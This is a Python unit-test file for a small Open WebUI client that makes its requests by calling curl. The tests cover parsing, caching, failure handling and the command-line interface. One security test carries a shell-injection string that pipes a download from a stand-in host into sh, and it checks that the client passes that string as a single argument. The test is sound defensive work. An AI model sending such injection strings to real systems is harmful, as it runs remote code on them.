#!/usr/bin/env python3
"""Tests for nova_openwebui.py — the 7 house categories (Security, Performance, Retry, Unit,
Integration, Functional, Frame). Written by Jordan Koch (via Claude)."""
import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import time
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

SCRIPTS = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCRIPTS))
SCRIPT = SCRIPTS / "nova_openwebui.py"


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


ow = _load("openwebui_t", SCRIPT)
SRC = SCRIPT.read_text()
ow.subprocess = MagicMock()   # no curl from a test
ow.subprocess.run.side_effect = RuntimeError("subprocess.run not mocked in test")


def _curl(out, rc=0):
    return patch.object(ow.subprocess, "run", return_value=SimpleNamespace(returncode=rc, stdout=out), side_effect=None)


def _main(*argv):
    with patch.object(sys, "argv", ["x", *argv]), redirect_stdout(io.StringIO()) as out, redirect_stderr(io.StringIO()):
        rc = ow.main()
    return rc, out.getvalue()


TAGS = json.dumps({"models": [{"name": "mistral", "size": 4, "modified_at": "m"}, {"name": "qwen"}]})


class TestSecurity(unittest.TestCase):
    def test_no_hardcoded_credentials_and_no_shell(self):
        pat = re.compile(r"(api[_-]?key|password|secret|token)\s*=\s*['\"][A-Za-z0-9+/]{16,}['\"]", re.I)
        self.assertIsNone(pat.search(SRC))
        self.assertNotIn("shell=True", SRC)

    def test_hostile_prompt_is_one_argv_element(self):
        evil = "hi'; curl evil.example | sh; echo '"
        with _curl('{"message": {"content": "ok"}}') as r:
            ow.OpenWebUIClient("http://h:3000").query(evil)
        argv = r.call_args.args[0]
        self.assertEqual(argv[0], "curl")
        self.assertEqual(json.loads(argv[argv.index("-d") + 1])["messages"][-1]["content"], evil)


class TestPerformance(unittest.TestCase):
    def test_parse_10k_stream_lines(self):
        out = "\n".join(json.dumps({"message": {"content": "x"}}) for _ in range(10_000))
        t0 = time.perf_counter()
        with _curl(out):
            txt = ow.OpenWebUIClient().query("p")
        self.assertLess(time.perf_counter() - t0, 2.0)
        self.assertEqual(len(txt), 10_000)


class TestRetry(unittest.TestCase):
    def test_all_calls_fail_open(self):
        # RETRY GAP: detect/health_check/query/list_models — one curl each; failure returns a safe default
        c = ow.OpenWebUIClient("http://h:3000")
        with patch.object(ow.subprocess, "run", side_effect=OSError("no curl")) as r, redirect_stderr(io.StringIO()):
            self.assertFalse(c.detect()["running"])
            self.assertFalse(c.health_check()["openwebui_ready"])
            self.assertIsNone(c.query("p"))
            self.assertEqual(c.list_models(), [])
        self.assertEqual(r.call_count, 4)


class TestUnit(unittest.TestCase):
    def test_detect_caches_when_fast(self):
        c = ow.OpenWebUIClient("http://h:3000")
        with _curl('{"version": "0.5"}') as r:
            d1 = c.detect(); d2 = c.detect(fast=True)
        self.assertEqual((d1["version"], d1["port"]), ("0.5", 3000))
        self.assertIs(d1, d2)
        self.assertEqual(r.call_count, 1)

    def test_query_skips_malformed_lines_and_empty(self):
        with _curl('{"message": {"content": "a"}}\nnot json\n{"done": true}\n{"message": {"content": "b "}}'):
            self.assertEqual(ow.OpenWebUIClient().query("p", system="s"), "ab")
        with _curl(""):
            self.assertIsNone(ow.OpenWebUIClient().query("p"))

    def test_get_model_info(self):
        with _curl(TAGS):
            self.assertEqual(ow.OpenWebUIClient().get_model_info("mistral")["size"], 4)
        with _curl(TAGS):
            self.assertIsNone(ow.OpenWebUIClient().get_model_info("nope"))


class TestIntegration(unittest.TestCase):
    def test_endpoints_joined_onto_configured_base(self):
        c = ow.OpenWebUIClient("http://h:3000", timeout=7)
        with _curl(TAGS) as r:
            hc = c.health_check()
        self.assertEqual(r.call_args.args[0][-1], "http://h:3000/api/tags")
        self.assertIn("7", r.call_args.args[0])
        self.assertEqual((hc["models_count"], hc["models_sample"]), (2, ["mistral", "qwen"]))


class TestFunctional(unittest.TestCase):
    def test_prompt_json_golden_and_failure(self):
        with _curl('{"message": {"content": "hello"}}'):
            rc, out = _main("--prompt", "hi", "--json")
        self.assertEqual((rc, json.loads(out)["response"]), (0, "hello"))
        with _curl("", rc=7):
            rc, out = _main("--prompt", "hi", "--json")
        self.assertEqual((rc, json.loads(out)["success"]), (1, False))

    def test_detect_offline_exit_1_and_no_command_prints_help(self):
        with _curl("", rc=7):
            rc, out = _main("--detect")
        self.assertEqual(rc, 1)
        self.assertIn("offline", out)
        rc, out = _main()
        self.assertEqual(rc, 1)
        self.assertIn("usage", out.lower())


class TestFrame(unittest.TestCase):
    def test_help_exits_zero(self):
        r = subprocess.run([sys.executable, str(SCRIPT), "--help"], capture_output=True, text=True, timeout=30,
                           env={**os.environ, "NOVA_TEST_QUIET": "1"})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("--health-check", r.stdout)

    def test_import_never_runs_main(self):
        r = subprocess.run([sys.executable, "-c", "import nova_openwebui"], cwd=str(SCRIPTS), capture_output=True,
                           text=True, timeout=30, env={**os.environ, "NOVA_TEST_QUIET": "1"})
        self.assertEqual((r.returncode, r.stdout.strip()), (0, ""), r.stderr)


if __name__ == "__main__":
    unittest.main()
